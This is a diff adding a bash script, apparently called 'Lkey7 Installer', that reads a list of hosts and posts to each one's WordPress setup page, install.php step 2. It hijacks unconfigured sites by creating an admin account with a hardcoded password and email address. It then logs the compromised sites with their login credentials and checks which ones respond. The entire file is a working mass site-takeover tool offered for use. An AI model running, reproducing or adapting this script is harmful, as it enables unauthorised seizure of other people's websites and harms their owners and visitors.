@@ -1,0 +1,80 @@
+rm succes.txt
+clear
+mrh="\033[31m"
+kun="\033[33m"
+kunt="\033[33;1m"
+ijo="\033[32m"
+wet="\033[97;1m"
+nat="\033[0m"
+bir="\033[90;36m"
+ijo="\033[32m"
+nat="\033[0m"
+logo(){
+echo -e """
+	       █████████████████████
+	    ████▀                 ▀████
+	  ███▀                       ▀███
+	 ██▀                           ▀██
+	█▀                               ▀█
+	█                                 █
+	█ ${mrh}  █████                 █████${nat}   █ 
+	█ ${mrh} ████████             ████████${nat}  █ 
+	█ ${mrh} █████████           █████████${nat}  █ 
+	█ ${mrh} █████   ██         ██   █████${nat}  █ 
+	█▄ ${mrh} ████   ███       ███   ████${nat}  ▄█ 
+	▀█▄  ${mrh} ▀████████     ████████▀${nat}   ▄█▀ 
+	  █▄   ${mrh} ▀█████▀     ▀█████▀ ${nat}   ▄█   
+	 ▄██           ▄█ █▄           ██▄            
+	 ███           ██ ██           ███            
+	 ███                           ███
+	  ▀██  ██▀██  █  █  █  ██▀██  ██▀
+	   █████▀ ██  █  █  █  ██ ▀████▀
+	    ▀██▀  █    ${mrh}Lkey7${nat}    █  ▀██▀
+	          █  ${mrh}Installer${nat}  █
+	          ██  █  █  █  ██
+	           █▄▄█▄▄█▄▄█▄▄█"""
+}
+instal(){
+echo ''
+read -p " Input List: " lis;
+while read list; do
+c=$(curl -s -N -d "weblog_title=My Wordpress Blog&user_login=admin&user_name=admin&admin_password=S4635&admin_password2=S4635&admin_email=modcanel123@gmail.com&Submit=submit" https://${list}/wp-admin/install.php?step=2 | grep -oP "<td>admin</td>")
+if [ $c ]; then
+echo ${list} >> succes.txt
+echo -e " [${ijo}Succes${nat}]${ijo} http://${list}/wp-login.php#admin@S4635 ${nat}"
+else
+echo https://$list/wp-login.php#admin@Sandani235# >> failed
+fi
+done < $lis
+rm failed
+}
+ques(){
+printf 'NEXT (y/n)? '
+read answer
+
+if [ "$answer" != "${answer#[Yy]}" ] ;then 
+    echo Yes
+else
+    exit
+fi
+}
+cek(){
+while read list; do
+c=$(curl -s "${list}" -L | grep -oP '<title>(.*?)</title>' | cut -d ">" -f2 | cut -d "<" -f1)
+if [[ $c ]]; then
+echo -e " http://${list}/wp-login.php#admin@S4635" >> good.txt
+echo -e " ${ijo}[${mrh}Found${ijo}]${nat} ${ijo}http://${list}/wp-login.php#admin@S4635 ${nat}"
+else
+echo ${list} >> error.txt
+fi
+done < succes.txt
+echo -e ${ijo} "---[SELESAI BOSS]--- ${nat}"
+rm error.txt
+}
+main(){
+logo
+instal
+ques
+cek
+}
+main
